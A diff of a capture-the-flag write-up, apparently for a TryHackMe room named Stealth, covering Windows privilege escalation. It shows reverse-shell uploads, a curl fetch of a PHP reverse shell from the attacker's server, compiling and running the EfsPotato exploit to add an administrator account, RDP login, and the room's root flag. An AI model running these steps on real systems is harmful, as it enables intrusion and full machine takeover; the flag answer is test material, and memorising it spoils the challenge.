@@ -197,8 +197,7 @@ Host script results:
 
 - setup a listener<br>
 - uploaded <code>powershell-reverse-shell.ps1</code> again<br>
-- navigated to <code>C:\xampp\htdocs\uploads</code><br>
-- executed: <code>powershell.exe</code><br>
+- navigated to <code>C:\Users\evader\Desktop</code><br>
 - executed: <code>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</code><br>
 - waited ...<br>
 - identified status: <code>Vulnerable - High</code>, Name: <code>Apache 2.4</code>, ImagePath: <code>"C:\xampp\apache\bin\httpd.exe"</code><br><br><br>
@@ -206,9 +205,19 @@ Host script results:
 - navigated to <code>https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</code><br>
 - downloaded <code>php_reverse_shell.php</code><br>
 - updated the IP<br>
-- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code><br>
+- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code> in to <code>C:\xampp\htdocs</code><br><br>
 - setup a listener<br>
-- navigated to <code>stealth.com:8443/php_reverse_shell.php</code></p>
+- navigated to <code>stealth.com:8443/php_reverse_shell.php</code><br>
+- identified <code>SeImpresonatePrivilege</code> enabled<br>
+- downloaded <code>EFsPotato.cs</code> tool from <code>https://github.com/zcgonvh/EfsPotato</code><br>
+- copied it as <code>Potato.cs</code> to the Target<br>
+- compiled it executing:<code>csc.exe Potato.cs</code><br>
+- confirmed that <code>Potato.exe</code> was generated<br><br>
+- added user <code>lili</code>
+- added <code>lili</code> to <code>administrators</code>´ localgroup<br>
+- confirmed that <code>lili</code> was added to <code>administrators</code>´ localgroup<br><br>
+- executed <code>xfreerdp</code> and accessed Windows environment<br>
+- dicovered the flag in <code>Administrator</code>´s Desktop</p>
 
 <br>
 <br>
@@ -226,16 +235,9 @@ Host script results:
 <img width="1126" height="80" alt="image" src="https://github.com/user-attachments/assets/de68918a-5748-4732-84b8-e43311de02ed" />
 
 <br>
-<br>
 
 
-<p>Potato</p>
-
-
-https://github.com/zcgonvh/EfsPotato
-Downloaded EfsPotato.cs
-
-
+```bash
 C:\xampp\htdocs>C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe Potato.cs
 Microsoft (R) Visual C# Compiler version 4.8.3761.0
 for C# 5
@@ -243,6 +245,11 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 
 This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versio
 ...
+```
+
+<br>
+
+```bash
 C:\xampp\htdocs>dir
  Volume in drive C has no label.
  Volume Serial Number is A8A4-C362
@@ -254,18 +261,19 @@ C:\xampp\htdocs>dir
 08/17/2023  05:09 AM             5,024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2
 07/16/2023  04:29 PM           213,642 background-image.jpg
 07/11/2023  05:11 PM             9,711 background-image2.jpg
-08/22/2025  08:28 PM               469 e.cs
-08/22/2025  08:14 PM               469 EfsPotato.cs
 08/17/2023  05:11 AM             3,554 font.css
 08/29/2023  09:55 AM             3,591 index.php
-08/22/2025  08:04 PM             9,407 php_reverse_shell.php
-08/22/2025  08:39 PM            25,441 Potato.cs
-08/22/2025  08:40 PM            17,920 Potato.exe
-08/22/2025  08:04 PM    <DIR>          uploads
+08/22/2025  xx:xx PM             9,407 php_reverse_shell.php
+08/22/2025  xx:xx PM            25,441 Potato.cs
+08/22/2025  xx:xx PM            17,920 Potato.exe
+08/22/2025  xx:xx PM    <DIR>          uploads
               10 File(s)        289,228 bytes
                3 Dir(s)  13,590,577,152 bytes free
-...
+```
 
+<br>
+
+```bash
 C:\xampp\htdocs>Potato.exe "net user lili pass123& /add"
 Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
@@ -280,6 +288,12 @@ CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes su
 The command completed successfully.
 
 
+C:\xampp\htdocs>
+```
+
+<br>
+
+```bash
 C:\xampp\htdocs>Potato.exe "net localgroup administrators lili /add"
 Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
@@ -295,13 +309,17 @@ The command completed successfully.
 
 
 C:\xampp\htdocs>
+```
 
-
-
+<br>
+<br>
 
 <img width="1331" height="501" alt="image" src="https://github.com/user-attachments/assets/40b0d737-645e-4cfc-8662-1c21dfbc816c" />
 
+<br>
+<br>
 
+```bash
 C:\xampp\htdocs>Potato.exe "net localgroup administrators"
 Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
 Part of GMH's fuck Tools, Code By zcgonvh.
@@ -325,23 +343,28 @@ The command completed successfully.
 
 
 C:\xampp\htdocs>
+```
 
+<br>
+<br>
 
 <img width="1326" height="413" alt="image" src="https://github.com/user-attachments/assets/44f14cd1-ed20-4f62-a563-5786b5cc9a89" />
-
 
 <br>
 <br>
 
 <h3>xfreerdp</h3>
 
-:~/Stealth# xfreerdp /v:'10.201.124.246' /u:'lili' /p:'pass123&
+```bash
+:~/Stealth# xfreerdp /v:'xx.xxx.xxx.xxx' /u:'lili' /p:'pass123&
+```
 
+<br>
+<br>
 
 <img width="814" height="600" alt="image" src="https://github.com/user-attachments/assets/4e3ecd0b-dbd8-4da2-87c0-2522370231e0" />
 
 <br>
-
 <br>
 
 <img width="818" height="368" alt="image" src="https://github.com/user-attachments/assets/1ef66d38-13a7-4b77-a19d-71524c3c1ac6" />
@@ -352,9 +375,7 @@ C:\xampp\htdocs>
 <p>1.2. What is the content of the root level flag?<br>
 <code>THM{101011_ADMIN_ACCESS}</code></p>
 
-<br>
 
-<br>
 <br>
 <br>
 <br>
